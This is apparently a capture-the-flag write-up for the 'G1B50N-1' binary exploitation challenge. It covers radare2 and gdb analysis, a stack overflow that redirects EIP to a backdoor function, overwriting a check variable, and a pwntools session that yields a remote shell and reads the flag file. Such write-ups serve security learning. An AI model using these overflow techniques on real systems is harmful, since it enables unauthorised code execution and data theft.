#G1B50N-1

400
Binary Exploitation
7 Solves

## Description
This looks like a very "secure" system. But there just might be a backdoor...

p.s. according to rumours, the admin has a habit of storing his flags in the home directory.

Interact with the service at: challenges.csdc20t.ctf.sg:10014

Hint: EIP

## Given files
g1b50n-1

# Solution
Since the hint is EIP, this is probably a question to overwrite EIP.

ltrace, strings brought up some minor things
1. Classic `printf`, `scanf` being used
    * scanf so maybe a buffer overflow like last time?
2. There is this weird string '* BACKDOOR ACTIVATED *' and '/bin/sh'. Maybe there is a backdoor function?

How about radare2?
```
$ r2 ./g1b50n-1 
[0x080484e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x080484e0]> afl
0x08048400    3 35           sym._init
0x08048440    1 6            sym.imp.printf
0x08048450    1 6            sym.imp.fflush
0x08048460    1 6            sym.imp.puts
0x08048470    1 6            sym.imp.system
0x08048480    1 6            sym.imp.exit
0x08048490    1 6            sym.imp.__libc_start_main
0x080484a0    1 6            sym.imp.setvbuf
0x080484b0    1 6            sym.imp.memset
0x080484c0    1 6            sym.imp.__isoc99_scanf
0x080484d0    1 6            sub.__gmon_start_80484d0
0x080484e0    1 33           entry0
0x08048510    1 4            sym.__x86.get_pc_thunk.bx
0x08048520    4 43           sym.deregister_tm_clones
0x08048550    4 53           sym.register_tm_clones
0x08048590    3 30           sym.__do_global_dtors_aux
0x080485b0    4 43   -> 40   entry.init0
0x080485db    1 32           sym.backdoor
0x080485fb    4 710          sym.main
0x080488d0    4 93           sym.__libc_csu_init
0x08048930    1 2            sym.__libc_csu_fini
0x08048934    1 20           sym._fini
[0x080484e0]> 
```

Ah yes, a sym.backdoor function. Now time to decompile. Check `decompile.c` for the decompilation
1. Looking at the sym.backdoor, it seems like we don't even have to inject shellcode! Just run the function at loc_0x80485db I guess
2. The input string is at location 0x804926e
3. We can't just overwrite the variable used in the main if statement, as it doesn't lead to the backdoor. So yeah, the hint EIP

gdb Time!
1. Set breakpoint at `break *0x0804872f`

Inputing in a string`AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ` * 50 or so did not appear to have an effect

When inputing in 1 set of the alphabet string above
```
x/40xw $esp
0xffffcce0:	0x0804926e	0xffffcce8	0x41414141	0x42424242
0xffffccf0:	0x43434343	0x44444444	0x45454545	0x46464646
0xffffcd00:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xffffcd10:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xffffcd20:	0x4f4f4f4f	0x50505050	0x51515151	0x52525252
0xffffcd30:	0x53535353	0x54545454	0x55555555	0x56565656
0xffffcd40:	0x57575757	0x58585858	0x59595959	0x5a5a5a5a
0xffffcd50:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcd60:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcd70:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) info reg
eax            0x1                 1
ecx            0x0                 0
edx            0xf7fa501c          -134590436
ebx            0x0                 0
esp            0xffffcce0          0xffffcce0
ebp            0xffffcde8          0xffffcde8
esi            0xf7fa3000          -134598656
edi            0xf7fa3000          -134598656
eip            0x804872f           0x804872f <main+308>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb)
```

My goal is to overwrite EIP for now I think, or at least, the function return call (at 0x080488c0) or something similar.
* Another idea is to modify the GOT table or something, idk

Some research on the EIP pointer that may be useful
1. https://stackoverflow.com/questions/32345320/get-return-address-gdb
## Know what to do
We need to go to the backdoor function (or at least, it's easier)
```
Pwn Me => 
Breakpoint 2, 0x0804872a in main ()
(gdb) jump *0x80485db
Continuing at 0x80485db.
* BACKDOOR ACTIVATED *
[Detaching after vfork from child process 32414]
/bin/sh: 1: AAAA�BBBB: not found

Program received signal SIGSEGV, Segmentation fault.
0x0804927a in ?? ()
(gdb) 
```
Yeah, 0x80485db (from the decompiled file) is the right address to go to

## How to inject data?
Let's look at the memory first
```
(gdb) info stack
#0  0x0804872f in main ()
(gdb) info frame
Stack level 0, frame at 0xffffcdf0:
 eip = 0x804872f in main; saved eip = 0xf7de5751
 Arglist at 0xffffcde8, args: 
 Locals at 0xffffcde8, Previous frame's sp is 0xffffcdf0
 Saved registers:
  ebp at 0xffffcde8, eip at 0xffffcdec
(gdb) x/24xw $ebp
0xffffcde8:	0x00000000	0xf7de5751	0x00000001	0xffffce84
0xffffcdf8:	0xffffce8c	0xffffce14	0x00000001	0x00000000
0xffffce08:	0xf7fa3000	0xffffffff	0xf7ffd000	0x00000000
0xffffce18:	0xf7fa3000	0xf7fa3000	0x00000000	0x767efa95
0xffffce28:	0x354b3c85	0x00000000	0x00000000	0x00000000
0xffffce38:	0x00000001	0x080484e0	0x00000000	0xf7fe9790
(gdb) x/24xw $esp
0xffffcce0:	0x0804926e	0xffffcce8	0x41414141	0x080488c0
0xffffccf0:	0x42424242	0x00000000	0x00000000	0x00000000
0xffffcd00:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcd10:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcd20:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffcd30:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```
The saved eip and 1 value at ebp `0xf7de5751` looks familiar. Let's try overwriting it

`solve.py`:
```
from pwn import *
diff = 0xffffcde8-0xffffcce8#-0xf7de5751 #esp+8 - eip #0x804872f
print(diff)
padding = "A"*int(diff+4)
eip = p32(0x080488c0)
exploit=padding+eip+"BBBB"
```
```
Breakpoint 1, 0x0804872f in main ()
(gdb) x/72xw $esp+8
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd48:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd58:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd68:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd78:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd88:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd98:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcda8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcdb8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcdc8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcdd8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcde8:	0x41414141	0x080488c0	0x42424242	0xffffce00
0xffffcdf8:	0xffffce8c	0xffffce14	0x00000001	0x00000000
(gdb) info frame
Stack level 0, frame at 0xffffcdf0:
 eip = 0x804872f in main; saved eip = 0x80485db
 Arglist at 0xffffcde8, args: 
 Locals at 0xffffcde8, Previous frame's sp is 0xffffcdf0
 Saved registers:
  ebp at 0xffffcde8, eip at 0xffffcdec
(gdb) 

```
Welp, this still works normally though

idk what I;m doing so back to research.
Apparently from this [website](https://security.stackexchange.com/questions/186779/unable-to-understand-eip-changes-with-buffer-overflow) I should overflow the previous stack pointer (which is the current stack pointer because main?)`0xffffcdec`. So let's try that!

I realised I should be using less python scripts first lol, and use more GDB. So GDB commands.
```
set {int}0xffffcdec=0x80485db
```
Still no effect though. Kind of annoyed that there was no progress, so I tried spamming filler characters until the thing crashes. If it crashes it probably means some unknown pointer was overwritten.
1. On testing, it crashes when there are 25600 filler characters "A" , SIGSEGV
2. Crashes at 6400, 5000,4900, 4890, 4880 (+8 characters)
3. Does not crash at 4196,4800, 4878
```
Continuing.
Program received signal SIGSEGV, Segmentation fault.
0xf7e1c29c in ?? () from /lib/i386-linux-gnu/libc.so.6
```

Ok after even more research, I realised this idea can be similar to another [question](https://exploit.education/protostar/stack-four/)
* Still doesn't help

## Remember to disable System Security
After looking through the code again, I realised My code didn't run even after overwriting the return pointer is because the code calls `exit()` first before returning out of the main function. Totally didn't take me an hour to figure out. So we need to also overflow the appropriate register.
1. The thing checked is at $ebp-0x100
2. The values checked against are at 0x804b038?

Decompiled code
```
	int scanf(const char * format : (*0x804926e)0x00177ef4 = %s)
       esp += 8
       eax = dword obj.checker  //[0x804b04c:4]=0x177efc
       edx = dword [eax]
       eax = dword obj.canary   //[0x804b038:4]=0xc0c0dede
       var = edx - eax
       if (var) goto 0x8048759  //likely             
```
GDB Memory Locations
```
Breakpoint 1, 0x0804872f in main ()
(gdb) x/24xw $ebp-0x100
0xffffcce8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffccf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd08:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd18:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd28:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcd38:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) x/24xw 0x804b038
0x804b038 <canary>:	0xc0c0dede	0x00000000	0xf7fa35c0	0xf7fa3d80
0x804b048 <completed.7209>:	0x00000000	0xffffcce8	0x00000000	0x00000000
0x804b058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b078:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b088:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```

YES IT WORKS!!!!!!!!!!!!!
```
 ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄        ▄ 
▐░░░░░░░░░░░▌  ▄█░░░░▌    ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░▌      ▐░▌
▐░█▀▀▀▀▀▀▀▀▀  ▐░░▌▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█░█▀▀▀▀▀█░▌▐░▌░▌     ▐░▌
▐░▌            ▀▀ ▐░░▌    ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌
▐░▌ ▄▄▄▄▄▄▄▄      ▐░░▌    ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░▌ ▐░▌   ▐░▌
▐░▌▐░░░░░░░░▌     ▐░░▌    ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌
▐░▌ ▀▀▀▀▀▀█░▌     ▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░▌   ▐░▌ ▐░▌
▐░▌       ▐░▌     ▐░░▌    ▐░▌       ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌
▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░░█▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░▌     ▐░▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░▌      ▐░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀        ▀▀ 
******************************************************************************
*                        CAN YOU PWN THE G1B50N?                             *
******************************************************************************
Pwn Me => 
Breakpoint 2, 0x0804872a in main ()
(gdb) c
Continuing.

Breakpoint 1, 0x0804872f in main ()
(gdb) c
Continuing.
DISABLING SYSTEM SECURITY...
* BACKDOOR ACTIVATED *
[Detaching after vfork from child process 6905]

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
`[Detaching after vfork from child process 6905]` Just means the shell ran but was killed by gdb

## Netcat
```
$ python solve.py 
244
[+] Opening connection to challenges.csdc20t.ctf.sg on port 10014: Done
 ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄        ▄ 
▐░░░░░░░░░░░▌  ▄█░░░░▌    ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░▌      ▐░▌
▐░█▀▀▀▀▀▀▀▀▀  ▐░░▌▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█░█▀▀▀▀▀█░▌▐░▌░▌     ▐░▌
▐░▌            ▀▀ ▐░░▌    ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌
▐░▌ ▄▄▄▄▄▄▄▄      ▐░░▌    ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░▌ ▐░▌   ▐░▌
▐░▌▐░░░░░░░░▌     ▐░░▌    ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌
▐░▌ ▀▀▀▀▀▀█░▌     ▐░░▌    ▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░▌   ▐░▌ ▐░▌
▐░▌       ▐░▌     ▐░░▌    ▐░▌       ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌
▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░░█▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░▌     ▐░▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░▌      ▐░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀        ▀▀ 
******************************************************************************
*                        CAN YOU PWN THE G1B50N?                             *
******************************************************************************
Pwn Me =>
[*] Switching to interactive mode
 DISABLING SYSTEM SECURITY...
* BACKDOOR ACTIVATED *
$ hello
/bin/sh: 1: hello: not found
$ ls
bin
boot
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cd /home/
$ ls
g1b50n-1
$ cd g1b50n-1
$ ls
Makefile
flag.txt
g1b50n-1
main.c
$ cat flag.txt
CTFSG{r0w_r0w_r0w_y0ur_b04t}
$  
```
# Flag
`CTFSG{r0w_r0w_r0w_y0ur_b04t}`
Took me 3 hours